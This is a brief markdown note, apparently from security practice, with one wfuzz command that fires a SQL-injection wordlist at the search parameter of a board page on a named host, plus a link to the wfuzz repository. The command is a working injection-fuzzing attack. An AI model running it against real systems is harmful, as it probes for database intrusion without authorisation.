
# Payload
```sh
wfuzz -c -z file,/root/wfuzz/wordlist/Injections/SQL.txt -d "catgo=title&search=FUZZ" -u http://ssh.knock-on.org:10005/board/board_searched.php
```



# Reference
[공식 깃헙](!https://github.com/xmendez/wfuzz)
